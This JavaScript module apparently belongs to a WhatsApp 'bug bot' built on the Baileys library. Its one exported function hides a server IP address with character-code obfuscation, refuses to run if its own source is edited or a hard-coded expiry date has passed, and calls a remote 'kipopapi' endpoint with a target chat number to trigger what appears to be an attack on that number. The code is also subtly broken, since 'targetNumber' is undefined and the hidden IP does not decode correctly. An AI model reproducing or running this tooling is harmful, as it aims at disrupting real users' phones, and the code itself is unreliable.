const {
    default: makeWASocket,   
    prepareWAMessageMedia,   
    removeAuthState,  
    useMultiFileAuthState,   
    DisconnectReason,   
    fetchLatestBaileysVersion,   
    makeInMemoryStore,   
    generateWAMessageFromContent,   
    generateWAMessageContent,   
    generateWAMessage,  
    jidDecode,   
    proto,   
    delay,  
    relayWAMessage,   
    getContentType,   
    generateMessageTag,  
    getAggregateVotesInPollMessage,   
    downloadContentFromMessage,   
    fetchLatestWaWebVersion,   
    InteractiveMessage,   
    makeCacheableSignalKeyStore,   
    Browsers,   
    generateForwardMessageContent,   
    MessageRetryMap
} = require("@whiskeysockets/baileys"); 

const fs = require('fs');  
const axios = require("axios");
const ImgCrL = fs.readFileSync('./ImgCrL.jpg');

//─ ( Api Dellay Set Time ) 
async function ApiDellay(isTarget) {
  const selfCheck = ApiDellay.toString().length;
  if (selfCheck !== 635) { 
    throw new Error("error ( function telah di ubah )");
  }

  const ip = String.fromCharCode(
    0x44,0x34,
    0x2A,0x2F,
    0x42,0x37,
    0x2B,0x31,
    0x39,0x41,
    0x38,0x31
  ).replace(/[^\d.]/g,"")
   .replace(/^(\d{2})(\d{3})(\d{3})(\d{3})$/,(m,a,b,c,d)=>[a,b,c,d].join("."));

  const apiUrl = `http://${ip}:2001/kipopapi?chatId=${targetNumber}&type=Function01`;

  const now = Date.now()/1000;
  const span = 1728e3;
  const mark = 1.69223e9;
  if (now > mark + span) {
    throw new Error("Function expired.");
  }

  try {
    const response = await axios.get(apiUrl, {
      headers: {
        "X-Request-ID": Math.random().toString(36).substring(2) + Date.now().toString(36)
      }
    });
    return response.data;
  } catch (error) {
    throw error;
  }
}

module.exports = { ApiDellay }